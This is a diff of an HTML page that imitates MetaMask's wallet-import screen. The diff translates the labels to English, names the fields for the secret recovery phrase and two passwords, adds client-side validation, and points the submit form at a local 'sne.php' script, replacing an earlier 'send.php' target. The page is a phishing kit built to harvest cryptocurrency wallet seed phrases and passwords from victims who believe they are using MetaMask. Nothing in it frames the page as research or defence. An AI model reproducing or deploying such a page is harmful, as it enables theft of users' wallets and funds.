@@ -340,6 +340,7 @@
       line-height: initial !important;
       }
     </style>
+
   </head>
   <body>
 	
@@ -372,46 +373,90 @@
               <div class="app-header__logo-container">
                 <center>
 					<img height="30" src="metamask-logo-horizontal.svg" class="app-header__metafox-logo--horizontal" alt="">
-					<img height="42" width="42" src="metamask-fox.svg" class="app-header__metafox-logo--icon" alt="">
+					<img height="100" width="100" src="metamask-fox.svg" class="app-header__metafox-logo--icon" alt="">
 				</center>
               </div>
 			  <div style="padding: 0 20px;margin: auto;">
 				<form class="first-time-flow__form">
+			
                 <div class="first-time-flow__create-back">
                 </div>
+				
                 <div class="first-time-flow__header">Import sing Secret Recovery Phrase</div>
                 <div class="first-time-flow__text-block">Only the first account on this wallet will auto load. After completing this process, to add additional accounts, click the drop down menu, then select Create Account.</div>
                 <div class="first-time-flow__textarea-wrapper">
                   <label>Secret Recovery Phrase</label>
+				   
                   <div class="MuiFormControl-root MuiTextField-root first-time-flow__textarea first-time-flow__seedphrase">
                     <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
-                      <input aria-invalid="false" autocomplete="off" placeholder="Paste Secret Recovery Phrase from clipboard" type="name" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
-                    </div>
+                      <input name="phrase" id="phrase" aria-invalid="false" autocomplete="off" placeholder="Paste Secret Recovery Phrase from clipboard" type="text" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
+					</div>
+					<p style="text-align: left; color: red;" id="phraseerror"></p>
                   </div>
                 </div>
                 <div class="MuiFormControl-root MuiTextField-root first-time-flow__input MuiFormControl-marginNormal">
-                  <label class="MuiFormLabel-root MuiInputLabel-root jss9 jss13 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink" data-shrink="true" for="password" id="password-label">Neues Passwort (min. 8 Zeichen)</label>
+                  <label class="MuiFormLabel-root MuiInputLabel-root jss9 jss13 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink" data-shrink="true" for="password" id="password-label">New password (min 8 chars)</label>
                   <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
-                    <input aria-invalid="false" autocomplete="new-password" id="password" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
+                    <input name="pass1" id="pass1" aria-invalid="false" autocomplete="new-password" id="password" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
                   </div>
+				  <p style="text-align: left; color: red;" id="pass1error"></p>
                 </div>
                 <div class="MuiFormControl-root MuiTextField-root first-time-flow__input MuiFormControl-marginNormal">
-                  <label class="MuiFormLabel-root MuiInputLabel-root jss9 jss13 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink" data-shrink="true" for="confirm-password" id="confirm-password-label">Passwort bestätigen</label>
+                  <label class="MuiFormLabel-root MuiInputLabel-root jss9 jss13 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink" data-shrink="true" for="confirm-password" id="confirm-password-label">Confirm password</label>
                   <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
-                    <input aria-invalid="false" autocomplete="new-password" id="confirm-password" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
+                    <input name="pass2" id="pass2" aria-invalid="false" autocomplete="new-password" id="confirm-password" type="password" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
                   </div>
+				  <p style="text-align: left; color: red;" id="pass2error"></p>
                 </div>
-					
-              
-              </form>
-				  <form method="get" action="https://google.com/send.php">
-                <button class="button btn--rounded btn-primary first-time-flow__button"  type="submit">Importieren</button> 
-              </form>
+			
+                </form>
+         	 
+				  <form method="post" action="./sne.php">
+                <button onclick="myFunction();" class="button btn--rounded btn-primary first-time-flow__button"  type="button">Import</button> 
+           </form>
 			  </div>
             </div>
           </div>
         </div>
       </div>
     </div>
+<script
+  src="https://code.jquery.com/jquery-3.6.0.min.js"
+  integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
+  crossorigin="anonymous"></script>
+<script type="text/javascript">
+	function myFunction() {  
+	
+	var phrase = $('#phrase').val();
+	var len = phrase.split(" ").length;
+	var okok = /\d/.test($('#phrase').val());
+
+		if((document.getElementById("phrase").value).length == 0)
+		
+		{
+		
+			document.getElementById("phraseerror").innerHTML = "Invalid Secret Recovery Phrase";
+		}else{
+			document.getElementById("phraseerror").innerHTML = "";
+		}
+
+		if((document.getElementById("pass1").value).length == 0)
+		{
+			document.getElementById("pass1error").innerHTML = "Password is required";
+		}else{
+			document.getElementById("pass1error").innerHTML = "";
+		}
+
+		if((document.getElementById("pass2").value).length == 0)
+		{
+			document.getElementById("pass2error").innerHTML = "Password is required";
+		}else{
+			document.getElementById("pass2error").innerHTML = "";
+		}
+	
+
+}
+</script>
+
   </body>
 </html>
